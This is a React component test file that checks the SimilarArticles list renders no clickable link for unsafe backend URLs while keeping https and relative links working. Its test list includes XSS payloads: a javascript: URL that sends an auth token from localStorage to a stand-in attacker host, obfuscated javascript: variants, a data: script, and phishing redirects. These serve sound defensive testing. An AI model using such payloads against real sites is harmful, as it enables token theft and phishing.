import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import SimilarArticles from './SimilarArticles'

const POISONED_URLS = [
  "javascript:fetch('https://evil.example/?t='+localStorage.getItem('vccircle_auth_token'))",
  'JaVaScRiPt:alert(1)',
  'java\tscript:alert(1)',
  ' javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  '//evil/phish',
  '\\\\evil.com',
  '\\/evil.com',
]

function mockSimilarArticles(urls: string[]) {
  vi.stubGlobal(
    'fetch',
    vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({
        similar_articles: urls.map((url, i) => ({
          id: 100 + i,
          title: `Article ${i}`,
          url,
          category: 'Deals',
        })),
      }),
    })
  )
}

function renderAndWait(compact: boolean) {
  const view = render(<SimilarArticles articleId={1} compact={compact} />)
  return waitFor(() => expect(screen.getAllByText(/^Article \d$/).length).toBeGreaterThan(0)).then(
    () => view
  )
}

beforeEach(() => {
  vi.clearAllMocks()
})

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('SimilarArticles — unsafe backend URLs are not clickable', () => {
  it.each(POISONED_URLS)('compact list renders no link for %j', async (url) => {
    mockSimilarArticles([url])
    const { container } = await renderAndWait(true)

    expect(screen.getByText('Article 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })

  it.each(POISONED_URLS)('card list renders no link for %j', async (url) => {
    mockSimilarArticles([url])
    const { container } = await renderAndWait(false)

    expect(screen.getByText('Article 0')).toBeTruthy()
    expect(container.querySelectorAll('a[href]')).toHaveLength(0)
  })
})

describe('SimilarArticles — safe URLs still link out', () => {
  it('renders a working link for an absolute https URL', async () => {
    mockSimilarArticles(['https://vccircle.com/news/deal-1'])
    const { container } = await renderAndWait(false)

    const link = container.querySelector('a[href]')
    expect(link?.getAttribute('href')).toBe('https://vccircle.com/news/deal-1')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('renders a working link for a same-origin relative path', async () => {
    mockSimilarArticles(['/articles/42'])
    const { container } = await renderAndWait(false)

    expect(container.querySelector('a[href]')?.getAttribute('href')).toBe('/articles/42')
  })

  it('keeps safe articles linked when a sibling article is poisoned', async () => {
    mockSimilarArticles(['javascript:alert(1)', 'https://vccircle.com/news/ok'])
    const { container } = await renderAndWait(false)

    const links = container.querySelectorAll('a[href]')
    expect(links).toHaveLength(1)
    expect(links[0].getAttribute('href')).toBe('https://vccircle.com/news/ok')
  })
})
